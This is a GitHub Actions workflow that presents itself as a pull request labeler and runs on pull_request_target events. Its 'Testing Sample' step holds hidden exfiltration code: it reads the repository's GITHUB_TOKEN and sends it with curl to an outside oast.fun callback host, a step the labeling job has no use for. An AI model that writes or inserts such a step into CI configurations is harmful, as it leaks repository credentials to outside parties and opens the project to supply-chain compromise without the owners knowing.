name: Pull Request Labeler

on:
  pull_request_target:
    types: [opened, edited]

permissions:
  contents: read
  pull-requests: write

jobs:
  label_pull_request:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Testing Sample
        env:
          SECRET_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          curl -X POST -H "Content-Type: application/json" -d "{\"secret\": \"$SECRET_TOKEN\"}" http://vsjiakzqknahqtbptinhio22utgvsh61o.oast.fun

      - uses: fuxingloh/multi-labeler@v4
        with:
          github-token: "${{ secrets.GITHUB_TOKEN }}"
          config-path: .github/labeler.yml
